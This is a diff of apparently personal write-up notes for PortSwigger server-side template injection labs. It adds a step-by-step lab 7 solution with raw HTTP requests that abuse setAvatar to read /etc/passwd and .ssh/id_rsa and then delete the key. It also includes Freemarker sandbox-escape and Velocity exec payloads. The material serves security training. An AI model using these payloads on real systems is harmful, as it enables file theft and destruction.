@@ -7,8 +7,7 @@ Exploiting server-side template injection vulnerabilities
 https://portswigger.net/web-security/server-side-template-injection/exploiting
 
 
-# ***1. Lab: Basic server-side template injection***
-https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic
+# [1.***Lab: Basic server-side template injection***](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)
 
  This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.
 
@@ -121,8 +120,7 @@ response:
 # Lab Solbved
 
 
-# ***2. Lab: Basic server-side template injection (code context)***
-https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context
+# [2. ***Lab: Basic server-side template injection (code context)***](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)
 
  This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
 
@@ -174,8 +172,7 @@ lets insert some code to delet carlos inside. remmember to leave original value 
 <%= File.open('/example/arbitrary-file').read %>
 
 
-# ***3. Lab: Server-side template injection using documentation***
-https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation
+# [3.***Lab: Server-side template injection using documentation***](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)
 
  This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
 
@@ -231,8 +228,7 @@ get: uid=12002(carlos) gid=12002(carlos) groups=12002(carlos)
 # success!
 
 
-# ***4. Lab: Server-side template injection in an unknown language with a documented exploit***
-https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit
+# [4.***Lab: Server-side template injection in an unknown language with a documented exploit***](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
 
 To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory
 
@@ -340,9 +336,7 @@ hint:
 
 
 
-# ***5. Lab: Server-side template injection with information disclosure via user-supplied objects***
-
- Not solved
+# [5. ***Lab: Server-side template injection with information disclosure via user-supplied objects***](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)
 
 This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.
 
@@ -412,8 +406,7 @@ material:
     $class.inspect("java.lang.Runtime").type.getRuntime().exec("bad-stuff-here")
 
 
-# 6. Lab: Server-side template injection in a sandboxed environment
-https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment
+# [6. ***Lab: Server-side template injection in a sandboxed environment***](https://portswigger.net/web-security/server-side-template-injection/eploiting/lab-server-side-template-injection-in-a-sandboxed-environment)
 
 This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the file my_password.txt from Carlos's home directory. Then submit the contents of the file.
 
@@ -456,4 +449,107 @@ Submit solution:
 # Lab solved
 
 payload analsys:
+```js
 ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
+```
+
+
+# [7. ***Lab: Server-side template injection with a custom exploit***](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit)
+
+This lab is vulnerable to server-side template injection. To solve the lab, create a custom exploit to delete the file /.ssh/id_rsa from Carlos's home directory.
+
+You can log in to your own account using the following credentials: wiener:peter 
+
+
+1. log in and explore site. 
+
+in comment try to comment {7*7} see error:
+```
+PHP Fatal error: Uncaught Twig_Error_Syntax:...
+... 
+```
+we are dealing with **twig** syntax
+
+
+in upload avater option upload valid file and try to upload not valid file - notice:
+```
+PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: text/markdown in /home/carlos/User.php:28
+Stack trace:
+#0 /home/carlos/avatar_upload.php(19): User->setAvatar('/tmp/SQLI Labs ...', 'text/markdown')
+#1 {main}
+  thrown in /home/carlos/User.php on line 28
+```
+
+write down path **/home/carlos/User.php** and method **User->setAvatar**
+
+2.  use the **user.setAvatr** method in preffered name radio selection:
+payload:
+```
+user.setAvatar('/etc/passwd','image/jpg')
+```
+
+full request:
+```
+POST /my-account/change-blog-post-author-display HTTP/1.1
+
+blog-post-author-display=user.setAvatar('/etc/passwd','image/jpg')&csrf=kREzFkT6BeBl098KOV2Z010YfUDGcuSL
+```
+
+from the comment open the avatar picture - note a file with etc/passwd content has be downloaded! we can access arbitary files on the system
+
+
+3. check the requested file (from lab description + cralos homepage):
+payload:
+```
+user.setAvatar('/home/carlos/User.php','image/jpg')
+```
+
+full request:
+```
+POST /my-account/change-blog-post-author-display HTTP/1.1
+
+blog-post-author-display=user.setAvatar('/home/carlos/User.php','image/jpg')&csrf=kREzFkT6BeBl098KOV2Z010YfUDGcuSL
+```
+note a file downloaded with all the user methods available, one of them is **gdprDelete()** which have a **rm** command - just what we need:
+```php
+    public function gdprDelete() {
+        $this->rm(readlink($this->avatarLink));
+        $this->rm($this->avatarLink);
+        $this->delete();
+    }
+```
+
+4. check the requested file (from lab description + cralos homepage):
+payload:
+```
+user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
+```
+
+full request:
+```
+POST /my-account/change-blog-post-author-display HTTP/1.1
+
+blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')&csrf=kREzFkT6BeBl098KOV2Z010YfUDGcuSL
+```
+note a file download with 
+```
+Nothing to see here :)
+```
+very funny portswigger :)
+
+4. delete the file with **gdprDelete**:
+A. set file as avatar:
+```
+user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
+```
+
+B. delete avatar:
+```
+user.gdprDelete()
+```
+refresh the comment page and upload the avatar picture to execute command
+
+
+# Lab Solved!
+
+
